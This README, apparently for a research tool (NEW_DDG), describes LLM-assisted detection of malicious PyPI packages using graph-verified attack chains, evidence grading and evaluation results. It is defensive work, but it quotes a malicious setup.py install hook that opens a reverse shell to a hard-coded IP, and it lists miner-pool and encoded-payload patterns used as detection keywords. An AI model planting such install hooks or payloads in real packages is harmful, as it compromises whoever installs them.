<div align="center">

# 🛡️ NEW_DDG

**LLM 构建攻击链，图结构保证真实性**
**面向 PyPI 恶意包的证据分级检测系统**

[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Tests](https://img.shields.io/badge/tests-14%20files%20%2F%20200%2B%20assertions-brightgreen.svg)](tests/)
[![Core](https://img.shields.io/badge/core-12k%20LOC-informational.svg)](#项目结构)
[![LLM: GLM](https://img.shields.io/badge/LLM-GLM--4--Flash%20%2B%20GLM--4--Plus-blueviolet)](https://open.bigmodel.cn/)

*SSO 粗筛 · 三层 CPG · LLM 自构建攻击链 · 程序化验证 · 两阶段异构模型 · 证据分级判决*

[English](README.md) | 简体中文

</div>

---

## 解决什么问题

包仓库的静态恶意检测器有两类互补的失败模式：

**规则类工具**（正则/启发式扫描）产生"看似合理但无证据支撑"的判决。正则看到
`exec(` 就报恶意——直到它跑在 `cffi`、`packaging` 或任何构建期合法生成代码的
项目上。在恶意语料上召回率很漂亮，放到真实 registry 上精度就崩了。

**LLM 类工具**修复了语义理解，却破坏了证据：问模型"这个包恶意吗"，它会自信
地回答——并幻觉出不存在的文件名、调用链和行为。它说的每一句话都无法核验。

NEW_DDG 走第三条路：

> **LLM 负责构建攻击链，程序负责验证每一跳。**
> 模型读取序列化的依赖图，提出恶意数据流路径。但一条路径只有满足
> 「每个节点真实存在、每一跳都是图中真实存在的边」才算数。幻觉链在影响
> 判决之前就会被确定性拒绝。

再加一条贯穿全系统的约束：

> **每一条 `MALICIOUS` 判决都必须有可人工核验的结构性证据——图验证的链路、
> 缺失的 PyPI 身份、或确认的安装钩子。推测只标注为 `SUSPICIOUS`，
> 永远不自行升级。**

---

## 系统架构

```
                 ┌─────────────────────────────────────────────┐
 .tar.gz / 目录 → │ ① SSO 粗筛（AST 解析，能力中性）              │
                 │   按文件提取安全敏感操作                      │
                 │   别名 / getattr / globals 调用还原          │
                 │   → 决定哪些文件进入建图                     │
                 └──────────────────┬──────────────────────────┘
                                    ▼
                 ┌─────────────────────────────────────────────┐
                 │ ② 图构建（裁剪版 DDG）                        │
                 │   类型化边: data/control/call/param/return   │
                 │   + 语句顺序执行边                           │
                 │   + 函数摘要 (参数→sink、返回值污染)           │
                 │   + AST 调用目标解析                         │
                 │   PyPI 特有: setup.py 与 import 期作用域      │
                 └──────────────────┬──────────────────────────┘
                                    ▼
                 ┌─────────────────────────────────────────────┐
                 │ ③ 图摘要（紧凑、可验证视图）                   │
                 │   短 ID（哈希乱序: 消除顺序偏见）              │
                 │   节点类型 · 函数边界图 · 跨作用域数据流        │
                 │   孤立载荷节点段 · IOC 字面量表                │
                 │   无危险标签（不引导模型）                     │
                 └──────────────────┬──────────────────────────┘
                                    ▼
     ┌───────────────────────────────────────────────────────────────┐
     │ ④ 第一阶段 — 小模型构建链路（GLM-4-Flash）                      │
     │   读图、沿边行走、提出候选攻击路径                               │
     └──────────────────┬────────────────────────────────────────────┘
                        ▼
     ┌───────────────────────────────────────────────────────────────┐
     │ ⑤ 程序验证（诚实层）                                           │
     │   节点 ID 必须存在 · 每一跳必须是真实边                         │
     │   部分路径接受（有效前缀）· 单节点证据要求                       │
     │   节点代码含敌意字面量（确定性检查）                             │
     │   幻觉链 → 拒绝，永远到不了裁判                                 │
     └──────────────────┬────────────────────────────────────────────┘
                        ▼
     ┌───────────────────────────────────────────────────────────────┐
     │ ⑥ 第二阶段 — 强模型判定（GLM-4-Plus）                          │
     │   只看验证通过的路径 + 被标记函数的源代码                        │
     │   领域惯用法知识（setuptools-scm 版本检测等）                    │
     │   包自我声明 → 意图 vs 行为比对                                 │
     └──────────────────┬────────────────────────────────────────────┘
                        ▼
     ┌───────────────────────────────────────────────────────────────┐
     │ ⑦ 证据门控 + 最终完整性检查                                     │
     │   无结构支撑的 MALICIOUS → 降级 SUSPICIOUS                     │
     │   事实级证据（PyPI 404 / 安装钩子）绕过模型直接定案               │
     └───────────────────────────────────────────────────────────────┘
```

---

## 核心创新：LLM 自构建链路 + 程序化验证

已有工作分两极。规则/ML 检测器匹配词汇——攻击者改个函数名匹配就失效。
LLM 判代码——语义强但不可验证，它说的话没法审计。

NEW_DDG 让 LLM 和图**在约束下协作**：

| 步骤 | 做什么 | 为什么重要 |
|---|---|---|
| 序列化 | 图变成紧凑文本视图：带类型/行号的节点、数据边、控制边（执行上下文）、函数边界、跨作用域数据流、孤立载荷节点、IOC 字面量 | 模型看到的是结构，不只是代码 |
| 链路提议 | 模型输出有序节点 ID 路径，先识别入口点和敏感操作 | 语义工作由模型完成——找到流 |
| 验证 | 每个 ID 对照图检查；每跳对照真实边；部分路径接受（前缀 ≥2 跳且覆盖 ≥50%）；单节点指控要求节点代码含敌意字面量 | 模型无法编造结构 |
| 裁决 | 强模型只看**验证通过**的路径 + 被标记的源代码 | 裁判基于事实推理，而非虚构 |

### 第二支柱：图是为模型协同设计的

经典 CPG 为符号分析而生——只有数据依赖，因为定理证明器不需要知道
"什么在什么之后执行"。而 LLM 构建链路需要另一种图。我们的图围绕这个
消费者重构，同时保持完全可程序验证：

| 图变更 | 驱动案例 | 实测效果 |
|---|---|---|
| **语句顺序边** —— 同作用域相邻语句建 `next_stmt` 边 | 纯数据依赖的 DDG 让 `install.run(self)` 与 `os.system(...)` 成为孤岛，模型连不出代码显而易见的行为（反弹 shell `shellapp` 实测） | 加入后召回 **+17%** |
| **哈希乱序短 ID** | 顺序编号 N1→N2→… 诱导模型"走编号"而不是"走边"（良性包上产出 219 跳的捏造路径） | 顺序幻觉链被消除 |
| **控制边对模型保留、对污点排除** | `if not exists('x'): Popen(...)` —— 分支上下文正是 payload 可疑的原因；污点分析必须忽略它，链路构建必须看到它 | 安装钩子链正确产出 |
| **函数边界图 + 跨作用域数据流 + module 级标记** | `setup.py` 顶层代码在**安装时**执行——执行时机本身就是证据 | 安装钩子链被显式点名 |
| **孤立载荷节点段 + 敌意字面量门** | 硬编码载荷没有上游流；模型要么漏掉要么编造链。显式列出；单节点证据仅对确定性敌意字面量模式开放 | 单行良性包的误指被拒；真挖矿/反弹 shell 被检出 |
| **IOC 字面量表**（矿池、shell IP、编码块） | 攻击基础设施散落在截断代码里 | 裁判在推理中点名基础设施 |
| **AST-repr 修复** | Python 3.8 无 `ast.unparse` → 节点"代码"退化为不可读的 `Call(func=Attribute(...))` | 模型看到真实源码 |
| **SSO 能力粗筛** | 1093 文件的 monorepo → 图预算 | 只选 8–23% 文件，分钟级→秒级 |

规律：**图是符号验证与神经推理之间的共享接口。** 每个构建决策都以它对
模型链路构建质量的影响来验证——仅顺序边一项就挽回 +17% 召回——同时
每个决策都保持图可被程序检查，反幻觉契约不依赖模型能力。

**实测收益：**

- 移除全部符号提示（无危险标签、无偏见排序）后判决**不变** → 模型在读代码，
  不是在附和正则层。
- 幻觉链（不存在的节点/边）被**机械拒绝**——良性语料上每一次幻觉指控都被拦截。
- 旧正则驱动管线只有 **22%** 的困难场景，LLM 自构建链路管线达到 **85–92%**。

这两大支柱——模型提议链路，图同时充当模型的**眼睛**和程序的**证据**——
正是本设计与"LLM 判代码"（不可验证）和"规则匹配代码"（无语义）的分界线。

### 实战示例（`shellapp-0.1.0`，安装钩子里的反弹 shell）

```python
class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        os.system("bash -i >& /dev/tcp/114.116.119.253/7777 <&1")
setup(..., cmdclass={'install': CustomInstallCommand})
```

模型读完摘要后的输出（验证通过的路径，节选）：

```
behavior: remote_payload_execution
N5  [import]  L3  from setuptools.command.install import install
N10 [expr]    L11 os.system("bash -i >& /dev/tcp/114.116.119.253/7777 <&1")
    ...由 install commandclass 守护，pip install 时执行
```

经典污点分析在这里无能为力——payload 是硬编码字面量，没有 source，
source→sink 链不成立。模型 + 图改为连接**导入 → 执行 → 安装钩子上下文**，
裁判点明攻击：*"包安装期间向远程 IP 发起反向 shell 连接。"*

---

## 两阶段异构模型

链路提取和恶意判定是两种认知任务、两种输入规模——所以用两个模型：

| 阶段 | 模型 | 输入 | 任务 | 成本特征 |
|---|---|---|---|---|
| ① 提链 | GLM-4-Flash（小） | 完整图摘要（大） | 沿边行走，提出候选路径 | 单价便宜、输入大 |
| ② 判定 | GLM-4-Plus（强） | 验证过的路径 + 源代码（小） | 带领域知识的语义判决 | 昂贵、但输入极小 |

成本结构是阶梯式：**良性包通常产不出验证路径，永远到不了强模型。** 实测：

- 强模型在 300 包运行中**推翻小模型保守判断 20 次**
  （小模型找到路径但不敢拍板，强模型确认）。
- 对已知惯用法，强模型的区分*精准*：

| 样本 | 判决 | 裁判理由（节选） |
|---|---|---|
| `exec(open("_version.py").read())` | BENIGN | "legitimate pattern for version detection"（setuptools-scm） |
| `Popen("bash -i >& /dev/tcp/<ip>/7777")` | MALICIOUS | "reverse shell to a remote IP" |
| `Popen([..., "-o", "pool.supportxmr.com", ...])` | MALICIOUS | "cryptocurrency miner without user consent" |
| `b64decode → os.system` | MALICIOUS | "classic remote payload execution" |

---

## 图构建：被真实失败逼出来的决策

下面每个决策都由真实包上的特定误报/漏检逼出，并由回归测试钉死。

**1. 语句顺序边（召回 +17%）。** 只建数据依赖的 DDG 会把 `install.run(self)`
和 `os.system(...)` 变成两个孤岛——模型连不出代码显而易见的行为。同作用域
相邻语句之间建 `next_stmt` 边（control 类型；污点分析排除它们，数据流语义
不变）。

**2. 锚点按风险特征命中数选择，而非按严重度/长度。** 在一个 4,085 节点、
1,120 个被正则标危险的包上，按"严重度+代码长度"排序让长的误报 docstring
占满锚点预算，真正的 XMRig 挖矿节点被挤出。现在锚点按节点实际包含的
高危特征数量（`subprocess`、`/dev/tcp`、`supportxmr`、`encodedcommand`…）
排序。

**3. AST-repr 修复。** Python 3.8 没有 `ast.unparse`，节点"代码"退化成
`Call(func=Attribute(value=Name(id=...)))`——模型读不懂，关键词层也匹配不上。
摘要层检测这种情况并从磁盘还原真实源码行。

**4. 摘要中不放危险标签（消融验证）。** `<<DANGER:critical>>` 标签来自正则
层——展示它们会把"LLM 读图"变成"LLM 附和正则"。消融结果：标签移除**且**
节点选择去偏（均匀采样替代危险优先）后，判决不变。模型真的在读代码。

**5. 孤立载荷节点 + 敌意字面量门。** 硬编码载荷（反弹 shell、挖矿、编码命令）
没有上游数据流，模型要么漏掉要么编造链。摘要现在显式列出它们
（`## ISOLATED PAYLOAD NODES`），单节点证据**仅当**节点代码确定性地包含
敌意字面量时才接受——同一个门也拒绝模型的幻觉性单节点指控（例如
`__version__ = "0.5.0"` 被标 MALICIOUS）。

**6. IOC 字面量表。** 矿池、shell IP、编码块收集进 `## SUSPICIOUS LITERALS`
段，模型可以在推理里点名攻击基础设施，而不是从截断代码里重新发现。

**7. 判决归一化 + 宽松 JSON。** 弱模型输出 `Uncertain`、`Clean`、
`Likely malicious`；长输出会在字符串中间截断。映射表 + 括号平衡解析器
挽回了 11 个 UNKNOWN 中的 5 个。

---

## 证据分级：不是所有证据都有定罪权

塑造这个系统最多的错误：在 `cffi`、`ag2`、`acryl-executor`（全是真实良性
项目）上，`exec(open("_version.py").read())`——setuptools-scm 的标准惯用法——
产生了 `file_read → code_execution` 链，"有链即恶"规则判死了它们。

修复是结构性的，不是调阈值：

| 证据层级 | 例子 | 权力 |
|---|---|---|
| **事实级** | PyPI 404（包名不存在）、确认的安装钩子 | 可单独定罪（完全绕过模型） |
| **结构级** | 图验证的链，且 source 是*强源*（网络/反序列化/编码）→ sink，或任意流 → 外传 | 模型确认后可定罪 |
| **语义级** | LLM 对验证路径 + 代码的判断 | 有结构支撑才可定罪；否则升级为 SUSPICIOUS |
| **启发级** | 正则命中、弱链（`env → exec`）、名称相似 | **永无定罪权。** 只能标 SUSPICIOUS |

"有链"不是判据——**链的形态才是**。而且输出前有最终完整性检查重新核验每条
`MALICIOUS`：无结构支撑 → 降级，不管它来自哪个通道。

---

## 检测能力

| 攻击形态 | 机制 |
|---|---|
| 反向 shell（`/dev/tcp`、硬编码 IP） | 图链 + 敌意字面量 + 安装钩子上下文 |
| 挖矿程序（XMRig/矿池） | IOC 表 + 模型链 + 意图错位 |
| 编码 PowerShell 投递 | 敌意字面量单节点证据 |
| 远程载荷（`b64decode → exec`） | LLM 链: 解码 → 执行 |
| 跨文件载荷拆分 | 跨作用域数据流 + 过程间边 |
| 包装函数隐藏执行（`_run(x)` → `os.system`） | 函数摘要传播 |
| `getattr`/别名/globals 动态分发 | AST 调用目标解析 |
| 安装钩子（`cmdclass` 覆盖） | 安装作用域检测 + 图上下文 |
| 安装期信息外传 | 凭据/环境 → 网络流 |
| Typosquatting / registry 下架 | 全量 50 万名索引 + PyPI 核验 |
| 代码克隆式名称抢注 | SHA-256 文件集重叠 vs 官方 sdist |
| 意图错位（声称用途 vs 实际行为） | 裁判上下文中的包自我声明 |

---

## 评测

以下数字除注明外均为**纯图 + LLM 管线**——无 registry 判决、无 API 名称
危险标签喂给裁判。

| 语料 | 规模 | 检出 | 硬误报 |
|---|---|---|---|
| 恶意（Backstabber's Knife Collection 系） | 500 | **90%**（多数票） | — |
| 恶意（v1 全量运行） | 5000 | 85% 直接，证据门重判后约 89% | — |
| 恶意（含 registry 通道） | 5000 | **94.9%**（该语料 99.6% 由 PyPI 404 贡献） | — |
| 良性（真实 PyPI 包，含对抗性：`cffi`、1136 函数的 `ag2`、`acryl-*` 企业 fork） | 58 | — | **0 硬误报** |
| 良性（PyPI 新下载小包，进行中） | ~500 | — | 趋势 0–1 |

隔离各贡献的消融：

| 消融项 | 影响 |
|---|---|
| 移除语句顺序边 | 召回 75% → 58%（−17） |
| 移除 LLM 链路（仅正则驱动管线） | 该语料召回 → 22% |
| 移除摘要中全部符号提示（标签 + 排序） | **不变**——模型读的是代码，不是正则层 |
| 加包意图上下文 + IOC 表 | 85% → 92%（中期，进行中） |
| 加 registry 通道（PyPI 404） | → 总计 94.9%；抓"代码是干净副本"的纯仿名包 |

**互补性论证（带数字）**：图+LLM 通道到 ~90%，registry 通道单独约 78%
（名字伪造）；代码分析是抓"真名包 + 注入代码"（XMRig 挖矿的 `requess`）的
**唯一**通道，registry 是抓"名字仿冒 + 干净代码副本"的唯一通道。二者互不覆盖。

### 测试

14 个测试文件、200+ 断言，全绿。图-LLM 接口套件钉死反幻觉契约
（幻觉节点/边拒绝、部分路径保留、单节点指控要求敌意字面量）和证据门
（弱链不定罪、惯用法知识不放走真恶意）——这些正是开发过程中在时间压力下
回归过的行为，所以现在它们是测试。


---

## 当前上限与下一阶段

按图规模实测（500 包运行，当前代码）：

| 图规模 | 包数 | 检出率 |
|---|---|---|
| ≤ 150 节点 | 214 | **99.1%** |
| 151–1500 节点 | 19 | 63% |
| > 1500 节点 | 19 | 21% |
| **总体（多数票）** | 254 | **89.4%** |

小包检出已接近饱和。当前的天花板是**中大包的信息损失与图语义缺口**——
不是模型能力，也不是链路构建方法。下一阶段两条主线：

**Phase A — 大包分块分析**（代码已在 `src/package_graph_analysis.py`，待接入主流程）：
按文件/函数切成 ≤500 节点的块，逐块独立分析后合并判决。预期把中大包
召回抬升至小包水平。

**Phase B — 缺失的边语义。** 模型只能构建图里存在的链。真实攻击会用、
而当前图缺失的四类边：

| 缺失边类型 | 真实攻击形态 | 现状 |
|---|---|---|
| 全局变量 / 模块级共享状态 | A 模块写 `CONFIG`，B 模块读后 `exec` | 未建模——链断 |
| 未解析的动态调用目标 | `dispatcher[name](payload)` | 部分支持（仅已知模式） |
| 深层跨函数参数传递 | `f(g(h(payload)))` | 部分支持（`arg_mappings` 覆盖不全） |
| 异常路径 | `except: exec(e)` | 未建模 |

历史上每补齐一类"模型需要但图没有"的边，召回就上一个可量化的台阶
（仅语句顺序边：+17%）。这四类是同一条路上的下一步。

---

## 已知限制

1. **"纯仿名 + 干净复制代码"超出图通道职责**——设计使然。`requestst`
   （`requests` 的完整副本）不含恶意*代码*；图通道标 SUSPICIOUS，
   registry 通道定罪。我们认为代码通道对干净代码定罪正是本系统要预防的
   误报失败模式。
2. **大型 monorepo**（> ~1000 个 Python 文件）可能耗尽分析预算，标记为
   `ANALYSIS_FAILED`（绝不静默 BENIGN）。摘要有体积上限；超大图上模型
   可能漏报。
3. **弱模型判决抖动。** 同一输入的单次调用可能在 MALICIOUS/SUSPICIOUS
   之间翻转。用多采样多数票缓解；单次模式实测稳定性更差。
4. **污点是语法级的，不是语义级的。** 经由三个各自调用"看似良性工具函数"
   的包装器路由的载荷可以逃过摘要扩展。
5. **以 PyPI 为中心的威胁模型。** 安装/导入期作用域规则和凭据路径是
   PyPI 特有的；移植到 npm/gems 需要新的惯用法知识，但不需要架构改动。
6. **依赖 LLM。** 链路阶段继承底层模型的语言覆盖和拒答行为；失败降级为
   SUSPICIOUS 或 UNKNOWN，绝不静默 BENIGN。

---

## 快速开始

```bash
pip install zhipuai networkx py2cfg
git clone https://github.com/chen-map/Pypi-Malicious-Code-detect-Static.git
cd Pypi-Malicious-Code-detect-Static
```

### 完整管线（两阶段，图 + LLM + registry）

```bash
python batch_solution_b_v2.py ./packages \
    --api-key "$GLM_API_KEY" \
    --count 100 \
    --llm-model glm-4-flashx \
    --verify-pypi \
    --parallel-workers 5
```

### registry 消融（纯图 + LLM，可离线验证）

```bash
python batch_solution_b_v2.py ./packages \
    --api-key "$GLM_API_KEY" --verify-pypi --no-pypi-gate --count 100
```

### 完全不用 LLM（确定性基线）

```bash
python batch_solution_b_v2.py ./packages --api-key dummy --count 50
```

### CLI 参数

```
位置参数:          tarfile_dir             .tar.gz 文件或解压目录
--api-key KEY      GLM API key             除 --api-key dummy 外必填
--llm-model M      第一阶段（提链）模型     默认: glm-4-flashx
--verify-pypi                              启用 registry 核验
--no-pypi-gate                             消融开关: registry 仅记录、永不定罪
--count N                                  最大包数
--extract-base D                           解压目录
--parallel-workers N                       LLM 调用并行度
--seed N                                   抽样种子（默认 42）
--no-llm-cache                             关闭判决缓存
--sandbox                                  行为探针（⚠️ 执行代码；仅限虚拟机）
```

### 测试

```bash
python tests/run_all.py     # 14 个文件；每个门控和修复都有测试钉死
```

---

## 输出格式

```jsonc
{
  "package_name": "…",
  "final_category": "MALICIOUS | SUSPICIOUS | BENIGN | OBFUSCATED | ANALYSIS_FAILED",
  "final_risk_score": 0.0,
  "final_confidence": 0.0,
  "voting_summary": "判决理由——永远有值",
  "detection_method": "enhanced_detection | sandbox_probe | voting",
  "subgraph_verdicts": [
    {
      "subgraph_name": "func_…",
      "final_verdict": "MALICIOUS",
      "taint_chain_count": 2,
      "taint_categories": [{"source_category": "…", "sink_category": "…"}],
      "escalated": false
    }
  ],
  "attack_chains": {"chain_count": 4, "completeness": 0.75},
  "enhanced_detection": {"threat_level": "…", "threats_found": 1},
  "analysis_degraded": false
}
```

`ANALYSIS_FAILED` 刻意与 `BENIGN` 区分：基础设施故障绝不能伪装成干净判决。

---

## 项目结构

```
NEW_DDG/
├── batch_solution_b_v2.py            # 编排：多通道、门控、最终完整性检查
├── src/
│   ├── sso_extractor.py              # SSO 粗筛：能力提取、别名解析
│   ├── graph_digest.py               # 图→文本序列化 + verify_paths（反幻觉）
│   ├── llm_graph_analyst.py          # 第一阶段提链（小模型）+ 验证
│   ├── two_stage_judge.py            # 第二阶段裁决（强模型）+ 上下文裁判
│   ├── package_graph_analysis.py     # 包级分块分析（大图）
│   ├── ddg_builder_v7.py             # DDG：类型化边、顺序边、摘要、调用目标
│   ├── taint_engine.py               # 反向 BFS 污点 + 证据分级（escalation_gate）
│   ├── call_resolver.py              # AST 调用目标解析（getattr/别名/globals）
│   ├── call_graph_analyzer.py        # 调用图 + 攻击链重建
│   ├── cfg_adapter.py                # py2cfg 集成 + 常量折叠可达性
│   ├── enhanced_detector.py          # registry 身份、安装钩子、元数据权威性
│   ├── pypi_verifier.py              # 存在性/版本/首发年龄核验
│   ├── pypi_index.py                 # 全量 50 万名索引 + 长度分桶
│   ├── duplicate_detector.py         # SHA-256 文件集重叠 vs 官方 sdist
│   ├── llm_sanitizer.py              # 注释/docstring 剥离、注入标记
│   ├── sandbox_probe.py              # audit-hook 行为探针（可选）
│   └── common/
│       ├── graph_partitioner.py      # 函数级分割
│       └── pattern_matcher.py        # 危险节点检测（仅用于排序）
├── SOLUTION_B_VOTING/src/            # 函数级分类器、规则评分器、优先级排序
├── scripts/                          # 离线重判（阶段 1 + 阶段 2）
├── tests/                            # 14 个套件 / 200+ 断言
└── docs/
```

---

## 参考

- **[MalSkills](https://arxiv.org/abs/2603.27204)**（华中科技大学，ASE 2026）——SSO 提取 → 依赖图 → 行为推理的架构来源；我们的粗筛和建图阶段沿用此形态并重新适配 PyPI 威胁模型，判定范式不同（LLM 自构建验证链 vs 符号规则）
- **[Backstabber's Knife Collection](https://github.com/cybertier/Backstabbers-Knife-Collection)** — 恶意语料来源
- **[Guarddog](https://github.com/DataDog/guarddog)**、**[Bandit4Mal](https://github.com/ohmtech-research/bandit4mal)** — 单通道基线
- **[py2cfg](https://github.com/jimenezj6/py2cfg)** — CFG 构建
- **[GLM（智谱 AI）](https://open.bigmodel.cn/)** — GLM-4-Flash（链路提取）与 GLM-4-Plus（判决）；亦全程参与结对编程

## 许可证

MIT — 见 [LICENSE](LICENSE)。

<div align="center">

**⚠️** 静态分析 + 可选行为探针。判决是附带证据的决策支持——每条
`MALICIOUS` 都给出链路、端点和需要核验的代码位置。

</div>
